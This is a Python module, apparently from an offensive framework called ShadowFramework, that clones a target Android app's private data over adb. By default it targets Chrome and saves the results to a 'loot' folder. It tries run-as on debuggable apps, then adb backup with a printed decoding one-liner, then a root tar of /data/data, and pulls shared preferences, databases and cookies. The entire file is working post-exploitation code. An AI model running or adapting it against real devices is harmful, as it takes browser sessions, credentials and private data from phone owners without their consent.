"""
ShadowFramework — App Data Cloner
Multi-method data extraction: run-as, adb backup, direct cp (root).
"""
import subprocess
import os
from pathlib import Path
from rich.console import Console
from rich.table import Table
from utils.logger import log_action

console = Console()

def _adb(dev, *args, timeout=30):
    cmd = ['adb', '-s', dev] + list(args)
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip(), r.stderr.strip(), r.returncode
    except subprocess.TimeoutExpired:
        return '', 'timeout', 1

class Module:
    MODULE_INFO = {
        'name': 'post/android/data_cloner',
        'description': 'Extracts app data via run-as (debuggable), adb backup, or root cp. Pulls shared_prefs, databases, cookies.',
        'options': {
            'DEVICE_ID':  'Target device serial',
            'TARGET_PKG': 'Package to clone [default: com.android.chrome]',
            'METHOD':     'Extraction method: auto, run-as, backup, root [default: auto]',
        }
    }

    def __init__(self, framework):
        self.framework = framework

    def _try_run_as(self, dev, pkg, local_dir):
        """Method 1: run-as (works on debuggable apps)."""
        console.print("  [cyan]→ Trying run-as (debuggable apps)...[/cyan]")
        
        # List files in app data dir
        out, err, rc = _adb(dev, 'shell', 'run-as', pkg, 'ls', '-R', '.')
        if rc != 0 or 'not debuggable' in err.lower() or 'unknown package' in err.lower():
            console.print(f"  [yellow]  run-as failed: {err[:80]}[/yellow]")
            return False

        # Extract key files
        targets = ['shared_prefs/', 'databases/', 'files/', 'cache/']
        pulled = 0
        for target in targets:
            # List files in each subdir
            file_list, _, _ = _adb(dev, 'shell', 'run-as', pkg, 'find', target, '-type', 'f', '-maxdepth', '2')
            if not file_list:
                continue
            for fpath in file_list.splitlines()[:20]:
                fpath = fpath.strip()
                if not fpath:
                    continue
                # Copy to tmp first (run-as can't directly pull)
                tmp_path = f'/data/local/tmp/shadow_clone_{pulled}'
                _adb(dev, 'shell', 'run-as', pkg, 'cp', fpath, tmp_path)
                
                local_path = local_dir / fpath
                local_path.parent.mkdir(parents=True, exist_ok=True)
                _, _, rc = _adb(dev, 'pull', tmp_path, str(local_path))
                if rc == 0 and local_path.exists():
                    pulled += 1
                _adb(dev, 'shell', 'rm', '-f', tmp_path)

        if pulled > 0:
            console.print(f"  [green]  run-as: Pulled {pulled} files.[/green]")
            return True
        return False

    def _try_backup(self, dev, pkg, local_dir):
        """Method 2: adb backup (works if allowBackup=true)."""
        console.print("  [cyan]→ Trying adb backup...[/cyan]")
        backup_path = str(local_dir / f'{pkg}.ab')
        _, err, rc = _adb(dev, 'backup', '-f', backup_path, '-noapk', pkg, timeout=30)
        if os.path.exists(backup_path) and os.path.getsize(backup_path) > 100:
            console.print(f"  [green]  Backup saved: {backup_path} ({os.path.getsize(backup_path)} bytes)[/green]")
            console.print(f"  [dim]  Decrypt with: dd if={backup_path} bs=24 skip=1 | python3 -c \"import zlib,sys;sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))\" | tar xf -[/dim]")
            return True
        else:
            console.print("  [yellow]  Backup empty or blocked (allowBackup=false).[/yellow]")
            if os.path.exists(backup_path):
                os.remove(backup_path)
            return False

    def _try_root(self, dev, pkg, local_dir):
        """Method 3: Direct copy with root (su)."""
        console.print("  [cyan]→ Trying root access...[/cyan]")
        
        # Check if we have root
        out, _, _ = _adb(dev, 'shell', 'su', '-c', 'id')
        if 'uid=0' not in out:
            console.print("  [yellow]  No root access available.[/yellow]")
            return False

        # Tar the app data dir and pull
        remote_tar = '/data/local/tmp/shadow_clone.tar'
        data_dir = f'/data/data/{pkg}'
        _adb(dev, 'shell', 'su', '-c', f'tar cf {remote_tar} {data_dir}', timeout=30)
        
        local_tar = str(local_dir / 'app_data.tar')
        _, _, rc = _adb(dev, 'pull', remote_tar, local_tar)
        _adb(dev, 'shell', 'rm', '-f', remote_tar)
        
        if rc == 0 and os.path.exists(local_tar) and os.path.getsize(local_tar) > 100:
            console.print(f"  [green]  Root extract: {local_tar} ({os.path.getsize(local_tar)} bytes)[/green]")
            return True
        return False

    def run(self):
        device_id = self.framework.options.get('DEVICE_ID', '')
        pkg = self.framework.options.get('TARGET_PKG', 'com.android.chrome')
        method = self.framework.options.get('METHOD', 'auto').lower()

        if not device_id:
            out, _, _ = _adb('', 'devices')
            for line in out.splitlines()[1:]:
                if '\tdevice' in line:
                    device_id = line.split('\t')[0]
                    break
        if not device_id:
            console.print("[red][!] No device found.[/red]")
            return

        local_dir = Path(f'loot/cloned_data/{pkg}')
        local_dir.mkdir(parents=True, exist_ok=True)

        console.print(f"[*] Cloning [cyan]{pkg}[/cyan] from [cyan]{device_id}[/cyan] (method: {method})")
        log_action(f"Data clone: {pkg} on {device_id}")

        success = False
        if method == 'auto':
            success = self._try_run_as(device_id, pkg, local_dir) or \
                      self._try_backup(device_id, pkg, local_dir) or \
                      self._try_root(device_id, pkg, local_dir)
        elif method == 'run-as':
            success = self._try_run_as(device_id, pkg, local_dir)
        elif method == 'backup':
            success = self._try_backup(device_id, pkg, local_dir)
        elif method == 'root':
            success = self._try_root(device_id, pkg, local_dir)

        if success:
            console.print(f"\n[bold green][+] Data cloned to {local_dir}[/bold green]")
            log_action(f"Data cloned from {pkg} → {local_dir}")
        else:
            console.print("\n[red][!] All extraction methods failed. Target may be non-debuggable with no root and backups disabled.[/red]")
